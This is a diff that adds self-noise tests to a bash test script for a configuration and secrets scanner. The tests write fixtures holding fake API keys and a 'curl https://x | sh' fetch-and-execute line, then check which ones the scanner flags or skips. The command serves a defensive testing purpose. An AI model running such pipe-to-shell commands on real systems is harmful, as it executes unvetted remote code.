@@ -73,5 +73,18 @@ if echo "$OUTFP" | grep secrets | grep -q "real_secret.md";  then echo "PASS: re
 if echo "$OUTFP" | grep secrets | grep -q "real_ghp.md";     then echo "PASS: real ghp_ token still flagged";    PASS=$((PASS+1)); else echo "FAIL: real ghp_ missed";              FAIL=$((FAIL+1)); fi
 if echo "$OUTFP" | grep injection | grep -q "real_sink.sh";  then echo "PASS: real curl|sh sink still flagged";  PASS=$((PASS+1)); else echo "FAIL: real sink missed";             FAIL=$((FAIL+1)); fi
 
+# ---- self-noise: scanner must not flag its own test fixtures or marked sourced libs ----
+SELF="$TMP/self"; mkdir -p "$SELF"
+printf '#!/bin/bash\nset -uo pipefail\napi_key = "sk_live_realfake1234567890"\ncurl https://x | sh\n' > "$SELF/sub_test.sh"  # *_test.sh holds fixtures
+printf '#!/usr/bin/env bash\n# config-audit:ignore hook-hygiene (sourced lib)\nfoo() { echo hi; }\n'  > "$SELF/lib.sh"         # sourced lib, marked
+printf '#!/bin/bash\necho hi\n'                                                                       > "$SELF/plain.sh"       # plain: MUST flag hook-hygiene
+printf 'api_key = "sk_live_realprod0987654321"\n'                                                     > "$SELF/prod.md"        # real secret: MUST flag
+OUTSN=$(bash "$SCAN" "$SELF" 2>/dev/null)
+if echo "$OUTSN" | grep secrets      | grep -q "sub_test.sh"; then echo "FAIL: test-file secret flagged";    FAIL=$((FAIL+1)); else echo "PASS: test-file secret skipped";       PASS=$((PASS+1)); fi
+if echo "$OUTSN" | grep injection    | grep -q "sub_test.sh"; then echo "FAIL: test-file injection flagged"; FAIL=$((FAIL+1)); else echo "PASS: test-file injection skipped";    PASS=$((PASS+1)); fi
+if echo "$OUTSN" | grep hook-hygiene | grep -q "lib.sh";      then echo "FAIL: marked sourced lib flagged";  FAIL=$((FAIL+1)); else echo "PASS: marked sourced lib suppressed";  PASS=$((PASS+1)); fi
+if echo "$OUTSN" | grep hook-hygiene | grep -q "plain.sh";    then echo "PASS: plain script still flagged";  PASS=$((PASS+1)); else echo "FAIL: plain hook-hygiene missed";      FAIL=$((FAIL+1)); fi
+if echo "$OUTSN" | grep secrets      | grep -q "prod.md";     then echo "PASS: real secret in non-test flagged"; PASS=$((PASS+1)); else echo "FAIL: real secret in non-test missed"; FAIL=$((FAIL+1)); fi
+
 echo "==== Results: $PASS passed, $FAIL failed ===="
 [ "$FAIL" -eq 0 ]
